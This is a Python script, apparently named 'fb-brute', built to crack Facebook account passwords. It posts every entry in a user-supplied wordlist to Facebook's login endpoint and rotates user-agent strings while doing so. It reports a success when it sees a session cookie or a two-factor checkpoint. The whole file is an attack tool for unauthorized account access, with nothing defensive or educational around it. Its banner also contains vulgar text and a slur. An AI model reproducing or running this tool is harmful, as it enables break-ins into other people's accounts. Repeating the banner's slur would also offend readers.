import sys
import requests
import random

email = input("Enter the Facebook Username (or) Email (or) Phone Number: ")
passwordlist = input("Enter the wordlist name and path: ")
login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [
    'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'
]

def main():
    welcome()
    search()
    print("Password does not exist in the wordlist")

def brute(password):
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    headers = {
        'User-agent': random.choice(useragents)
    }
    payload = {
        'email': email,
        'pass': password
    }
    response = requests.post(login, headers=headers, data=payload)
    if "c_user" in response.cookies:
        print("\n\n[+] Password found = {}".format(password))
        sys.exit(1)
    elif "checkpoint" in response.url:
        print("\n\n[+] Password found, but the account has a 2FA enabled = {}".format(password))
        sys.exit(1)

def search():
    with open(passwordlist, "r") as passwords:
        for password in passwords:
            password = password.strip()
            brute(password)

def welcome():
    wel = """
        +=========================================+
        |.............FCKN-FCEBOK-FAGZ............|
        +-----------------------------------------+
        |            #Author: TUKRU-MTHRFCKR      | 
        |            Version 1.0                  |
        +=========================================+
        |..........  fb-brute  ...........|
        +-----------------------------------------+\n\n
    """
    with open(passwordlist, "r") as total:
        total_lines = sum(1 for line in total)
    print(wel)
    print(" [*] Account to crack: {}".format(email))
    print(" [*] Loaded: ", total_lines, "passwords")
    print(" [*] Cracking, please wait ...\n\n")

if __name__ == '__main__':
    main()
